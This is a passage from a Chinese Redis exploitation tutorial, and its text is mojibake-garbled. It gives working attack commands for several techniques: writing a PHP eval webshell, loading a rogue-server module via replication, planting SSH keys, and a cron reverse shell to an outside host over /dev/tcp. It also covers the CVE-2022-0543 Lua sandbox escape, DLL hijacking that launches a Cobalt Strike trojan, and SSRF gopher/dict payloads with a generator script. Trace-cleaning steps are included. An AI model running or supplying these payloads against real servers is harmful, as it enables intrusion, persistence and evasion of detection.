¼å¼ä¸º save &lt;ç§’æ•°&gt; &lt;å˜åŒ–æ•°&gt;ï¼Œè¡¨ç¤ºåœ¨æŒ‡å®šçš„ç§’æ•°å†…æ•°æ®åº“å­˜åœ¨æŒ‡å®šçš„æ”¹å˜æ•°æ—¶è‡ªåŠ¨è¿›è¡Œå¤‡ä»½ä¹Ÿå°±æ˜¯æŒ‡å®šåœ¨å¤šé•¿æ—¶é—´å†…ï¼Œæœ‰å¤šå°‘æ¬¡æ›´æ–°æ“ä½œï¼Œå°±å°†æ•°æ®åŒæ­¥åˆ°æ•°æ®æ–‡ä»¶ï¼Œå¯ä»¥å¤šä¸ªæ¡ä»¶é…åˆ dbfilename dump.rdb æŒ‡å®šæœ¬åœ°æ•°æ®åº“æ–‡ä»¶åï¼Œé»˜è®¤å€¼ä¸º dump.rdb dir ./ æŒ‡å®šæœ¬åœ°æ•°æ®åº“å­˜æ”¾ç›®å½•ï¼ŒæŒ‡æ˜ Redis çš„å·¥ä½œç›®å½•ä¸ºè®¾å®šçš„ç›®å½•ï¼ŒRedis äº§ç”Ÿçš„å¤‡ä»½æ–‡ä»¶å°†æ”¾åœ¨è¿™ä¸ªç›®å½•ä¸‹ requirepass foobared è®¾ç½® Redis è¿æ¥å¯†ç ï¼Œå¦‚æœé…ç½®äº†è¿æ¥å¯†ç ï¼Œå®¢æˆ·ç«¯åœ¨è¿æ¥ Redis æ—¶éœ€è¦é€šè¿‡ AUTH å‘½ä»¤æä¾›å¯†ç ï¼Œé»˜è®¤å…³é—­ protected-mode redis3.2 ç‰ˆæœ¬åæ–°å¢ protected-mode é…ç½®ï¼Œé»˜è®¤æ˜¯ yes ï¼Œç”¨äºè®¾ç½®å¤–éƒ¨ç½‘ç»œè¿æ¥ redis æœåŠ¡ã€‚å…³é—­ protected-mode æ¨¡å¼ï¼Œæ­¤æ—¶å¤–éƒ¨ç½‘ç»œå¯ä»¥ç›´æ¥è®¿é—®ã€‚å¼€å¯ protected-mode ä¿æŠ¤æ¨¡å¼ï¼Œéœ€é…ç½® bind ip æˆ–è€…è®¾ç½®è®¿é—®å¯†ç ã€‚ 0x04 Redis Win&amp;Linxu æ¼æ´åˆ©ç”¨ Redisæœªæˆæƒ 1.æ¼æ´åˆ©ç”¨ ä¸‹è½½Redis-v3.0,é»˜è®¤æƒ…å†µä¸‹å¼€å¯redis-server.exe åˆ©ç”¨æ•°æ®åº“è¿æ¥å·¥å…·æ­£å¸¸è¿æ¥å³å¯ï¼Œæ— éœ€å¯†ç  åˆ©ç”¨ Redis å†™å…¥webshell 1.æ¼æ´åŸç† Rediså­˜åœ¨æŒä¹…åŒ–æœºåˆ¶ï¼Œåˆ†ä¸ºæ‰‹åŠ¨è§¦å‘å’Œè‡ªåŠ¨è§¦å‘ï¼Œå¯ä»¥ä½¿ç”¨saveå‘½ä»¤æ‰‹åŠ¨è§¦å‘å¤‡ä»½æ•°æ®åº“ä¸­çš„æ•°æ®ï¼Œé€šè¿‡è¿™ä¸ªæœºåˆ¶å¯ä»¥è¾¾åˆ°å‘æœåŠ¡å™¨ä»»æ„è·¯å¾„å†™å…¥ä»»æ„æ–‡ä»¶åå’Œä»»æ„æ–‡ä»¶å†…å®¹çš„ç›®çš„ã€‚ 2.åˆ©ç”¨åœºæ™¯ Redis å­˜åœ¨æœªæˆæƒè®¿é—®æˆ–è€…æš´ç ´å¯†ç æˆåŠŸï¼Œæœ€ç»ˆè¿æ¥Redisæ•°æ®åº“æˆåŠŸçš„æƒ…å†µä¸‹ï¼ŒåŒæ—¶å¼€å¯äº† web æœåŠ¡ï¼ŒçŸ¥é“ web ç›®å½•çš„ç»å¯¹è·¯å¾„ï¼Œå…·æœ‰æ–‡ä»¶è¯»å†™æƒé™ 3.åˆ©ç”¨è¿‡ç¨‹ # phpstudyä¸‹è½½å®‰è£…ï¼Œå…¨ç¨‹é»˜è®¤é€‰é¡¹å®‰è£… https://public.xp.cn/upgrades/phpStudy_64.zip #å®é™…åˆ©ç”¨ä¸­æŸ¥çœ‹å½“å‰æ•°æ®åº“æ˜¯å¦æœ‰ç¼“å­˜ dbsize #æœ‰ç¼“å­˜æ—¶åˆ‡æ¢åˆ°å…¶ä»–æ•°æ®åº“ï¼Œredisé»˜è®¤æœ‰16ä¸ªæ•°æ®åº“ï¼Œå°½é‡å¯»æ‰¾æ²¡æœ‰ç¼“å­˜æˆ–ç¼“å­˜è¾ƒå°‘çš„æ•°æ®åº“ select 15 #è‹¥æœªå‘ç°æœ‰å¯åˆ©ç”¨æ•°æ®åº“ï¼Œæ ¹æ®æƒ…å†µå†³å®šæ˜¯å¦éœ€è¦ä½¿ç”¨æ­¤å‘½ä»¤æ¸…é™¤æ‰€æœ‰æ•°æ®åº“ Flushall #å¼€å§‹åˆ©ç”¨ config set dir C:\\phpstudy_pro\\WWW config set dbfilename shell.php set xxx &quot;&lt;?php eval($_REQUEST[cmd]);?&gt;&quot; #\\r\\n\\r\\n ä»£è¡¨æ¢è¡Œçš„æ„æ€ï¼Œç”¨rediså†™å…¥æ–‡ä»¶çš„ä¼šè‡ªå¸¦ä¸€äº›ç‰ˆæœ¬ä¿¡æ¯ï¼Œåœ¨å†™å…¥ä¸€äº›åé—¨æ–‡ä»¶æ—¶è‡ªè¡Œåˆ†è¾¨æ˜¯å¦éœ€è¦æ·»åŠ æ¢è¡Œç¬¦ï¼Œä¸ªåˆ«æ–‡ä»¶å¦‚æœä¸æ¢è¡Œå¯èƒ½ä¼šå¯¼è‡´æ— æ³•æ‰§è¡Œ save åˆ©ç”¨ Redis ä¸»ä»å¤åˆ¶ Getshell 1.æ¼æ´åŸç† Redis æ˜¯ä¸€ä¸ªä½¿ç”¨ ANSIC ç¼–å†™çš„å¼€æºã€æ”¯æŒç½‘ç»œã€åŸºäºå†…å­˜ã€å¯é€‰æŒä¹…æ€§çš„é”®å€¼å¯¹å­˜å‚¨æ•°æ®åº“ã€‚ä½†å¦‚æœå½“æŠŠæ•°æ®å­˜å‚¨åœ¨å•ä¸ª Redis çš„å®ä¾‹ä¸­ï¼Œå½“è¯»å†™ä½“é‡æ¯”è¾ƒå¤§çš„æ—¶å€™ï¼ŒæœåŠ¡ç«¯å°±å¾ˆéš¾æ‰¿å—ã€‚ä¸ºäº†åº”å¯¹è¿™ç§æƒ…å†µï¼ŒRedis å°±æä¾›äº†ä¸»ä»æ¨¡å¼ï¼Œä¸»ä»æ¨¡å¼å°±æ˜¯æŒ‡ä½¿ç”¨ä¸€ä¸ª redis å®ä¾‹ä½œä¸ºä¸»æœºï¼Œå…¶ä»–å®ä¾‹éƒ½ä½œä¸ºå¤‡ä»½æœºï¼Œå…¶ä¸­ä¸»æœºå’Œä»æœºæ•°æ®ç›¸åŒï¼Œè€Œä»æœºåªè´Ÿè´£è¯»ï¼Œä¸»æœºåªè´Ÿè´£å†™ï¼Œé€šè¿‡è¯»å†™åˆ†ç¦»å¯ä»¥å¤§å¹…åº¦å‡è½»æµé‡çš„å‹åŠ›ï¼Œç®—æ˜¯ä¸€ç§é€šè¿‡ç‰ºç‰²ç©ºé—´æ¥æ¢å–æ•ˆç‡çš„ç¼“è§£æ–¹å¼ã€‚åŸºäº Redis ä¸»ä»å¤åˆ¶çš„æœºåˆ¶ï¼Œå¯ä»¥é€šè¿‡ FULLRESYNC å°†ä»»æ„æ–‡ä»¶åŒæ­¥åˆ°ä»èŠ‚ç‚¹ï¼ˆslaveï¼‰ä»è€Œåˆ©ç”¨æ¼æ´è·å–æƒé™ã€‚ 2.åˆ©ç”¨åœºæ™¯ Redis å­˜åœ¨æœªæˆæƒè®¿é—®æˆ–è€…æš´ç ´å¯†ç æˆåŠŸï¼Œæœ€ç»ˆè¿æ¥Redisæ•°æ®åº“æˆåŠŸçš„æƒ…å†µä¸‹ï¼Œç›®æ ‡æœºå’Œæ”»å‡»æœºç½‘ç»œäº’é€šï¼Œå¹¶ä¸”redisç‰ˆæœ¬èŒƒå›´ä¸º4.xã€5.xï¼Œé€šè¿‡ä¸»ä»å†™å…¥.soæˆ–è€…dllæ–‡ä»¶ï¼Œä»è€Œä½¿ç›®æ ‡æœºæ‰§è¡Œsoæˆ–dllæ–‡ä»¶ä¸­çš„å‘½ä»¤æ‰§è¡Œå‡½æ•°ã€‚ 3.åˆ©ç”¨è¿‡ç¨‹ docker pull vertigo/redis4 docker run -p 6379:6379 vertigo/redis4 #åˆ©ç”¨å·¥å…· https://github.com/Dliv3/redis-rogue-server python3 redis-rogue-server.py --rhost=10.100.6.50(ç›®æ ‡IP) --rport=6379 --lhost=10.100.4.189(æœ¬æœºIP) #é€€å‡ºå·¥å…·æ—¶ ctrl+c ä¼šè‡ªåŠ¨æ‰§è¡Œæ¸…ç†exp.soæ¨¡å—çš„å‘½ä»¤ #å·¥å…·ä¸­ä½¿ç”¨çš„å‘½ä»¤ 1.config set dir ./ 2.config set dbfilename exp.so 3.slaveof X.X.X.115 4.slaveof X.X.X.115 21000 #ä¸Šé¢çœ‹ç»‘å®šçš„æœåŠ¡æ®µç«¯å£æ˜¯21000 5.module load ./exp.so 6.slaveof no one 7.system.exec 'whoami' #æ¸…ç†ç—•è¿¹ 8.config set dbfilename dump.rdb 9.system.exec 'rm ./exp.so' 10.module unload system 0x05 Redis Linux æ¼æ´åˆ©ç”¨ åˆ©ç”¨ Redis å†™å…¥SSHå…¬é’¥ 1.æ¼æ´åŸç† sshå¯†é’¥ç™»å½•æ€ä¹ˆå®ç°å‘¢ï¼Ÿé€šè¿‡å·¥å…·ç”Ÿæˆå…¬é’¥å’Œå¯¹åº”çš„ç§é’¥ï¼Œå°†å…¬é’¥æ”¾åœ¨é¶æœºç‰¹å®šä½ç½®ç‰¹å®šæ–‡ä»¶åï¼Œæ”»å‡»æœºå°±å¯ä»¥ä½¿ç”¨ç§é’¥å»ç™»å½•sshã€‚ redisæ“ä½œåŒå†™webshellï¼Œåªæ˜¯å°†æœ¬æœºçš„sshå…¬é’¥ä½œä¸ºvalueï¼Œç„¶åé€šè¿‡ä¿®æ”¹æ•°æ®åº“çš„é»˜è®¤è·¯å¾„ä¸º/root/.sshå’Œé»˜è®¤çš„æ–‡ä»¶åauthorized.keysï¼ŒæŠŠæ•°æ®å¤‡ä»½åœ¨authorized.keysæ–‡ä»¶é‡Œï¼Œè¿™æ ·å°±å¯ä»¥ä½¿ç”¨å¯†é’¥è¿›è¡Œç™»å½•ã€‚ 2.åˆ©ç”¨åœºæ™¯ Redis å­˜åœ¨æœªæˆæƒè®¿é—®æˆ–è€…æš´ç ´å¯†ç æˆåŠŸï¼Œæœ€ç»ˆè¿æ¥Redisæ•°æ®åº“æˆåŠŸçš„æƒ…å†µä¸‹ï¼Œå¹¶ä¸”sshæœåŠ¡å¯¹å¤–å¼€æ”¾ï¼Œredisè¿›ç¨‹ä¸ºé«˜æƒé™ï¼Œå¯ä»¥é€šè¿‡å¯†é’¥ç™»è®¤è¯ã€‚ 3.åˆ©ç”¨è¿‡ç¨‹ # å®‰è£… openssh æœåŠ¡ sudo apt-get install openssh-server # å¯åŠ¨ ssh æœåŠ¡ sudo /etc/init.d/ssh start # é…ç½® root ç”¨æˆ·è¿æ¥æƒé™ sudo vim /etc/ssh/sshd_config PermitRootLogin yes # è®¾ç½®å…è®¸é€šè¿‡å…å¯†ç™»å½• AuthorizedKeysFile .ssh/authorized_keys .ssh/authorized_keys2 # é‡å¯ ssh æœåŠ¡ sudo /etc/init.d/ssh restart #æ”»å‡»æœºç”Ÿæˆsshå¯†é’¥ ssh-keygen -t rsa cat /home/root/.ssh/id_rsa.pub #ç”Ÿæˆå¸¦æœ‰æ¢è¡Œç¬¦çš„å¯†é’¥å¹¶ä¼ å…¥Redis (echo -e &quot;\\n\\n&quot;; cat /Users/sven/.ssh/id_rsa.pub; echo -e &quot;\\n\\n&quot;) &gt; key.txt cat key.txt | ./redis-cli -h 192.168.0.104 -x set xxx #è®¾ç½®ç›®å½• config set dir /root/.ssh/ #è®¾ç½®æ–‡ä»¶å set dbfilename authorized_keys #ä¿å­˜ save #è¿æ¥ç›®æ ‡æœåŠ¡å™¨ ssh -i /Users/sven/.ssh/id_rsa root@192.168.0.104 è®¾ç½®.sshç›®å½•çš„æ—¶å€™å¦‚æœæŠ¥é”™ (error) ERR Changing directory: No such file or directory æ˜¯é¶æœºä¸Šä¸å­˜åœ¨è¿™ä¸ªç›®å½•ï¼ŒåŸå› æ˜¯ .ssh æ˜¯è®°å½•å¯†ç ä¿¡æ¯çš„æ–‡ä»¶å¤¹ï¼Œå¦‚æœ root ç”¨æˆ·æ²¡æœ‰ç™»å½•è¿‡çš„è¯ï¼Œå°±æ²¡æœ‰ .ssh æ–‡ä»¶å¤¹ï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥é€šè¿‡åœ¨é¶æœºä¸Šè¿è¡Œè¿™æ¡å‘½ä»¤ ssh localhost æˆ–è€…æ‰‹åŠ¨åˆ›å»º .ssh ç›®å½•ï¼Œå®é™…ç¯å¢ƒä¸­ä¸ä¼šå‘ç”Ÿæ­¤é—®é¢˜ã€‚ åˆ©ç”¨ Redis å†™å…¥Linuxè®¡åˆ’ä»»åŠ¡ 1.æ¼æ´åŸç† é€šè¿‡å†™å…¥æ–‡ä»¶åˆ°ç³»ç»Ÿè®¡åˆ’ä»»åŠ¡ç›®å½• /var/spool/cron/rootæ–‡ä»¶æ¥æ‰§è¡Œï¼Œredisæ“ä½œåŒå†™webshellï¼Œåªæ˜¯å°†ä¸€å¥è¯è®¡åˆ’ä»»åŠ¡ä½œä¸ºvalueï¼Œç„¶åé€šè¿‡ä¿®æ”¹æ•°æ®åº“çš„é»˜è®¤è·¯å¾„ä¸º/var/spool/cron/å’Œé»˜è®¤çš„æ–‡ä»¶årootï¼ŒæŠŠæ•°æ®å¤‡ä»½åœ¨rootæ–‡ä»¶é‡Œï¼Œè¿™æ ·ç³»ç»Ÿå°±ä¼šæ ¹æ®è®¡åˆ’ä»»åŠ¡å†…å®¹å»è¿è¡Œå‘½ä»¤ã€‚ 2.åˆ©ç”¨åœºæ™¯ Redis å­˜åœ¨æœªæˆæƒè®¿é—®æˆ–è€…æš´ç ´å¯†ç æˆåŠŸï¼Œæœ€ç»ˆè¿æ¥Redisæ•°æ®åº“æˆåŠŸçš„æƒ…å†µä¸‹ï¼Œå¹¶ä¸”é¶æœºå‡ºç½‘ï¼ˆå¯è®¿é—®æ”»å‡»æœºï¼‰ï¼Œç›®æ ‡ä¸ºcentosç³»ç»Ÿï¼Œredisè¿›ç¨‹ä¸ºé«˜æƒé™ï¼Œå¯ä»¥è®¾ç½®è®¡åˆ’ä»»åŠ¡ã€‚ 3.åˆ©ç”¨è¿‡ç¨‹ æ”»å‡»æœºå¼€å¯ç«¯å£ç›‘å¬ nc -lvp 80 åˆ©ç”¨rediså†™å…¥linuxè®¡åˆ’ä»»åŠ¡ set xxx &quot;\\n\\n*/1 * * * * bash -i &gt;&amp; /dev/tcp/xx.xx.xx.xx/443 0&gt;&amp;1\\n&quot; //æ˜Ÿå·è¡¨ç¤ºçš„æ˜¯è®¡åˆ’ä»»åŠ¡çš„æ—¶é—´ï¼Œè¡¨ç¤ºæ¯åˆ†é’Ÿæ‰§è¡Œä¸€æ¬¡ config set dir /var/spool/cron/ config set dbfilename root save #è®¡åˆ’ä»»åŠ¡å‚æ•°è¯´æ˜ æ¯åˆ†é’Ÿéƒ½æ‰§è¡Œä¸€æ¬¡çš„è¯å°±é‡‡ç”¨é»˜è®¤çš„ * * * * * æ¯äº”åˆ†é’Ÿæ‰§è¡Œä¸€æ¬¡å¯ä»¥ */5 * * * * æ¯ä¸¤ä¸ªå°æ—¶æ‰§è¡Œä¸€æ¬¡çš„è¯å°±æ˜¯ * */2 * * * ç¬¬ä¸‰ä¸ª*æ˜¯æ—¥ï¼Œç¬¬å››ä¸ªæ˜¯æœˆï¼Œç¬¬äº”ä¸ªæ˜¯å‘¨ m:åˆ†é’Ÿ - ä»0åˆ°59çš„æ•´æ•° h:å°æ—¶ - ä»0åˆ°23çš„æ•´æ•° dom:å¤© - ä»1åˆ°31çš„æ•´æ•° (å¿…é¡»æ˜¯æŒ‡å®šæœˆä»½çš„æœ‰æ•ˆæ—¥æœŸ) mon:æœˆ - ä»1åˆ°12çš„æ•´æ•° (æˆ–å¦‚Janæˆ–Febç®€å†™çš„æœˆä»½) dow:å‘¨ä¸€åˆ°å‘¨æ—¥ - ä»0åˆ°7çš„æ•´æ•°ï¼Œ0æˆ–7ç”¨æ¥æè¿°å‘¨æ—¥ (æˆ–ç”¨Sunæˆ–Monç®€å†™æ¥è¡¨ç¤º) command: éœ€è¦æ‰§è¡Œçš„å‘½ä»¤ æ˜Ÿå·(*)è¡¨ç¤ºå‚æ•°æ‰€æœ‰å¯ç”¨çš„å€¼ï¼Œå¦‚æœä¸º5ä¸ª*ï¼Œå°±ä»£è¡¨æ¯åˆ†é’Ÿæ‰§è¡Œä¸€æ¬¡ ç¬¦å·â€œ/â€æŒ‡å®šæ­¥è¿›è®¾ç½®ã€‚â€œ/&lt;interger&gt;â€è¡¨ç¤ºæ­¥è¿›å€¼,æ¯”å¦‚*/2 * * * *ä»£è¡¨æ¯ä¸¤åˆ†é’Ÿæ‰§è¡Œä¸€æ¬¡ä»»åŠ¡ Redis Luaæ²™ç›’ç»•è¿‡å‘½ä»¤æ‰§è¡Œï¼ˆCVE-2022-0543ï¼‰ 1.æ¼æ´åŸç† Debianä»¥åŠUbuntuå‘è¡Œç‰ˆçš„æºåœ¨æ‰“åŒ…Redisæ—¶ï¼Œä¸æ…åœ¨Luaæ²™ç®±ä¸­é—ç•™äº†ä¸€ä¸ªå¯¹è±¡packageï¼Œæ”»å‡»è€…å¯ä»¥åˆ©ç”¨è¿™ä¸ªå¯¹è±¡æä¾›çš„æ–¹æ³•åŠ è½½åŠ¨æ€é“¾æ¥åº“libluaé‡Œçš„å‡½æ•°ï¼Œè¿›è€Œé€ƒé€¸æ²™ç®±æ‰§è¡Œä»»æ„å‘½ä»¤ã€‚ 2.åˆ©ç”¨åœºæ™¯ redisæœåŠ¡å¯¹å¤–å¼€æ”¾ï¼Œæœªæˆæƒæˆ–å·²çŸ¥å¯†ç ï¼Œç›®æ ‡ç³»ç»Ÿä¸ºDebianã€Ubuntu æˆ–å…¶ä»–åŸºäº Debian çš„ Linux å‘è¡Œç‰ˆç³»ç»Ÿï¼Œç‰ˆæœ¬ä¸º 2.2 &lt;= redis &lt; 6.2.5ã€‚ 3.åˆ©ç”¨è¿‡ç¨‹ #æœ¬åœ°å¤ç°ç¯å¢ƒæ‹‰å– git clone https://github.com/vulhub/vulhub.git cd vulhub/redis/CVE-2022-0543/ docker-compose up -d #è¿æ¥redisï¼Œä½¿ç”¨evalå‘½ä»¤æ‰§è¡Œå‘½ä»¤ï¼š eval 'local io_l = package.loadlib(&quot;/usr/lib/x86_64-linux-gnu/liblua5.1.so.0&quot;, &quot;luaopen_io&quot;); local io = io_l(); local f = io.popen(&quot;id&quot;, &quot;r&quot;); local res = f:read(&quot;*a&quot;); f:close(); return res' 0 #å€¼å¾—æ³¨æ„çš„æ˜¯ï¼Œä¸åŒç¯å¢ƒä¸‹çš„libluaåº“è·¯å¾„ä¸åŒï¼Œä½ éœ€è¦æŒ‡å®šä¸€ä¸ªæ­£ç¡®çš„è·¯å¾„ã€‚Vulhubç¯å¢ƒï¼ˆUbuntu fiocalï¼‰ä¸­ï¼Œè¿™ä¸ªè·¯å¾„æ˜¯/usr/lib/x86_64-linux-gnu/liblua5.1.so.0 #è‹¥é‡åˆ°ä¸å­˜åœ¨æ­¤.soæ–‡ä»¶ï¼Œå¯ä»¥å°è¯•ä»4.0éå†è‡³7.0 0x06 Redis Windowsæ¼æ´åˆ©ç”¨ åˆ©ç”¨ Redis ä¸»ä»å¤åˆ¶ DLLåŠ«æŒ Getshell 1.æ¼æ´åŸç† åˆ©ç”¨redisçš„ä¸»ä»åŠŸèƒ½ï¼Œå†™å…¥dbghelp.dllæ–‡ä»¶ï¼Œè¾¾åˆ°åœ¨redisæ‰§è¡ŒBGSAVEæˆ–è€…BGREWRITEAOFå‘½ä»¤æ—¶redisåŠ è½½dllçš„ç›®çš„ 2.åˆ©ç”¨åœºæ™¯ Redis å­˜åœ¨æœªæˆæƒè®¿é—®æˆ–è€…æš´ç ´å¯†ç æˆåŠŸï¼Œæœ€ç»ˆè¿æ¥Redisæ•°æ®åº“æˆåŠŸçš„æƒ…å†µä¸‹ï¼Œå¹¶ä¸”æ˜¯Windowsç³»ç»Ÿä¸‹çš„Redisã€‚ 3.åˆ©ç”¨è¿‡ç¨‹ #åˆ©ç”¨å·¥å…· https://github.com/r35tart/RedisWriteFile #ä¸Šä¼ åˆ¶ä½œå¥½çš„dbghelp.dll python3 RedisWriteFile.py --rhost 10.100.18.218(ç›®æ ‡æœº) --lhost 10.100.18.56(æœ¬æœº) --lfile dbghelp.dll --rfile dbghelp.dll #ä¸Šä¼ æœ¨é©¬exeåˆ°C:\\\\Windows\\\\Tempç›®å½•ï¼Œå®æˆ˜ä¸­exeè‡ªæ£€exeæ˜¯å¦å¤„äºå…æ€çŠ¶æ€ python3 RedisWriteFile.py --rhost 10.100.18.218 --lhost 10.100.18.56 --lfile dbghelp.exe --rfile dbghelp.exe --rpath &quot;C:\\\\Windows\\\\Temp&quot; åˆ¶ä½œåŠ«æŒçš„dll #dll-hijackingä¸‹è½½åœ°å€ https://github.com/rek7/dll-hijacking pythonä»£ç ç”ŸæˆDLLåŠ«æŒä»£ç ï¼Œæ›¿æ¢å¯¼å‡ºè·¯å¾„dbghelp_ä¸ºC:\\\\Windows\\\\System32\\\\dbghelp åœ¨DLLMainå‡½æ•°ä¸­æ·»åŠ è‡ªå·±çš„shellcodeæ‰§è¡Œé€»è¾‘ï¼Œæ­¤å¤„ä¸ºè°ƒç”¨å¦å¤–ä¸€ä¸ªæœ¨é©¬exe(è‡ªè¡Œåˆ¶ä½œcsä¸Šçº¿æœ¨é©¬ï¼Œä¼˜å…ˆä½¿ç”¨å…æ€æœ¨é©¬)ä½œä¸ºæ¼”ç¤ºï¼Œç„¶åç”Ÿæˆdllï¼Œåç§°æ”¹ä¸ºdbghelp.dll é¡ºåºæ˜¯å›ºå®šçš„ï¼Œå¿…é¡»å…ˆä¸Šä¼ dbghelp.dllï¼Œç„¶åä¸Šä¼ dbghelp.exe(æœ¨é©¬çš„åå­—ï¼Œä»»æ„åå­—éƒ½å¯ï¼Œå†™æ­»åœ¨dbghelp.dllä¸­ï¼Œè‡ªè¡Œæ›´æ”¹)ï¼Œå¦åˆ™å°†æ— æ³•ä¸Šä¼ æ–‡ä»¶è‡³redisç›®å½•ã€‚ è¿æ¥redisï¼Œä½¿ç”¨å‘½ä»¤BGSAVEè§¦å‘redisåŠ è½½dbghelp.dllï¼Œä»è€ŒæˆåŠŸè¿è¡Œdbghelp.exeæœ¨é©¬ä¸Šçº¿CS 0x07 SSRF å¯¹ Redis çš„åˆ©ç”¨ dictåè®® ç‰¹ç‚¹: å‘½ä»¤å¤šæ¡çš„è¯ï¼Œéœ€è¦ä¸€æ¡æ¡æ‰§è¡Œ,ä¸æ”¯æŒä¼ å…¥æ¢è¡Œ,ä¹Ÿä¸ä¼šå¯¹%0d%0è§£ç  æ ¼å¼: dict://serverip:port/å‘½ä»¤:å‚æ•° gopheråè®® ç‰¹ç‚¹: æ”¯æŒå¤šè¡Œè¾“å…¥ï¼Œå¿½ç•¥é¦–ä½å­—ç¬¦ä¸² æ ¼å¼: gopher://serverip:port/_data æ— è®¤è¯SSRFæ”»å‡» dictåè®®çš„æ”»å‡»: 1.è¿æ¥è¿œç¨‹ä¸»æœåŠ¡å™¨ curl dict://127.0.0.1:6379/slaveof:100.100.100.100:21000 2.è®¾ç½®ä¿å­˜æ–‡ä»¶å curl dict://127.0.0.1:6379/config:set:dbfilename:exp.so 3.è½½å…¥ exp.so curl dict://127.0.0.1:6379/module:load:./exp.so 4.æ–­å¼€ä¸»ä» curl dict://127.0.0.1:6379/slaveof:no:one 5.æ¢å¤åŸå§‹æ–‡ä»¶å curl dict://127.0.0.1:6379/config:set:dbfilename:dump.rdb 6.æ‰§è¡Œå‘½ä»¤ curl dict://127.0.0.1:6379/system.exec:'whomai' 7.åˆ é™¤ç—•è¿¹ curl dict://127.0.0.1:6379/system.exec:'rm ./exp.so' curl dict://127.0.0.1:6379/module:unload:system gopheråè®®çš„æ”»å‡»: #é‡‡å–Gopherus,å®ç°å¿«é€Ÿåˆ©ç”¨ï¼ŒGopheruså†…ç½®äº†è®¡åˆ’ä»»åŠ¡å’Œå†™webshellä¸¤ç§åˆ©ç”¨æ–¹å¼ git clone https://github.com/tarunkant/Gopherus.git cd Gopherus python2 gopherus.py --exploit redis æœ‰è®¤è¯SSRFæ”»å‡» gopheråè®®çš„æ”»å‡» #å¯†ç è®¾ä¸º123123 curl &quot;gopher://127.0.0.1:6379/_%2a%32%0d%0a%24%34%0d%0a%61%75%74%68%0d%0a%24%36%0d%0a%31%32%33%31%32%33%%0d%0a&quot; é€šç”¨åˆ©ç”¨è„šæœ¬ æ ¹æ®authPasså‚æ•°æœ‰å€¼æ— å€¼åŒºåˆ†redisæ˜¯å¦éœ€è¦è®¤è¯ï¼Œé»˜è®¤æ˜¯ä¸»ä»åˆ©ç”¨ä»£ç ï¼Œå¦‚webshellæˆ–è€…è®¡åˆ’ä»»åŠ¡è‡ªè¡Œä¿®æ”¹å…¶ä¸­çš„rediså‘½ä»¤å³å¯ #!/usr/bin/python3 # -*-coding:utf-8-*- #å‚è€ƒæ–‡ç« :https://xz.aliyun.com/t/7974#toc-20 # author:xq17 import urllib.parse def tranToResp(x): xSplit = x.split(&quot; &quot;) cmd=&quot;&quot; cmd+=&quot;*&quot;+str(len(xSplit)) for i in xSplit: i = i.replace(&quot;${IFS}&quot;,&quot; &quot;) cmd+=&quot;\\r\\n&quot;+&quot;$&quot;+str(len(i))+&quot;\\r\\n&quot;+ i cmd+=&quot;\\r\\n&quot; return cmd def GeneratePayload(ip, port): cmd=[ &quot;config set dir ./&quot;, &quot;config set dbfilename exp.so&quot;, &quot;slaveof {i} {p}&quot;.format(i=ip, p=port), &quot;module load exp.so&quot;, &quot;system.exec ls&quot;, &quot;system.exec rm${IFS}exp.so&quot;, &quot;quit&quot;, ] # &quot;system.exec bash${IFS}-i${IFS}&gt;&amp;${IFS}/dev/tcp/192.168.8.103/4607${IFS}0&gt;&amp;1&quot;, payload = &quot;&quot; for p in cmd: payload += urllib.parse.quote(tranToResp(p)) return payload def main(): # target ip = &quot;10.100.8.231&quot; port = &quot;6379&quot; # server load exp.so serverIp = &quot;10.100.8.188&quot; serverPort = &quot;21000&quot; authPass = &quot;&quot; payload = GeneratePayload(serverIp, serverPort) exitPayload = (urllib.parse.quote(tranToResp(&quot;slaveof no one&quot;) + tranToResp(&quot;quit&quot;) )) if authPass: print(&quot;author attack:&quot;) pd = &quot;gopher://{host}:{port}/_%2a%32%0d%0a%24%34%0d%0a%61%75%74%68%0d%0a%24{l}%0d%0a{p}%0d%0a&quot; pd = pd.format(host=ip, port=port, l=str(len(authPass)), p=authPass) print(pd + payload) print(&quot;clean footprint:&quot;) print(pd + exitPayload) else: print(&quot;no author attack:&quot;) pd = &quot;gopher://{host}:{port}/_&quot; print(pd.format(host=ip, port=port)+payload) print(&quot;clean footprint:&quot;) print(pd.format(host=ip, port=port) + exitPayload) if __name__ == '__main__': main() 0x08 Tips configå‘½ä»¤ç¦ç”¨ç»•è¿‡ å½“redis.conf é…ç½®äº†ç¦ç”¨configå‘½ä»¤çš„æ—¶å€™ã€‚ rename-command CONFIG &quot;&quot; æ¯”å¦‚è¿™ä¸ªconfigå‘½ä»¤å°±ä¸å¯ç”¨äº†ï¼Œå¯ä»¥é‡‡å–ä¸€ç§æ–¹å¼ç»•è¿‡ã€‚ è¿™ä¸ªæ—¶å€™æˆ‘ä»¬å°±æ²¡åŠæ³•è‡ªå®šä¹‰æ–‡ä»¶åç¼€äº†ï¼Œä½†æ˜¯æˆ‘ä»¬è¿˜æ˜¯å¯ä»¥åˆ©ç”¨ä¸»ä»å¤åˆ¶çš„ï¼Œä¸»ä»åŒæ­¥æ–‡ä»¶åexp.soçš„å†…å®¹è¢«ä¿å­˜ä¸ºäº†dump.rdbï¼ŒæŠŠdump.rdbå½“åšexp.soå»æ­£å¸¸åŠ è½½å³å¯ã€‚ module load ./dump.rdb è®¡åˆ’ä»»åŠ¡ä¸ºä½•æ²¡æœ‰æˆåŠŸåå¼¹shell å†™è®¡åˆ’ä»»åŠ¡åå¼¹shellå­˜åœ¨ç³»ç»Ÿé™åˆ¶ï¼Œè¿™ä¸ªæ–¹æ³•åªèƒ½Centosä¸Šä½¿ç”¨ï¼ŒUbuntuä¸Šè¡Œä¸é€šï¼ŒåŸå› å¦‚ä¸‹ï¼š å› ä¸ºé»˜è®¤rediså†™æ–‡ä»¶åæ˜¯644çš„æƒé™ï¼Œä½†ubuntuè¦æ±‚æ‰§è¡Œå®šæ—¶ä»»åŠ¡æ–‡ä»¶/var/spool/cron/crontabs/&lt;username&gt;æƒé™å¿…é¡»æ˜¯600ä¹Ÿå°±æ˜¯-rw-------æ‰ä¼šæ‰§è¡Œï¼Œå¦åˆ™ä¼šæŠ¥é”™(root) INSECURE MODE (mode 0600 expected)ï¼Œè€ŒCentosçš„å®šæ—¶ä»»åŠ¡æ–‡ä»¶/var/spool/cron/&lt;username&gt;æƒé™644ä¹Ÿèƒ½æ‰§è¡Œ å› ä¸ºredisä¿å­˜RDBä¼šå­˜åœ¨ä¹±ç 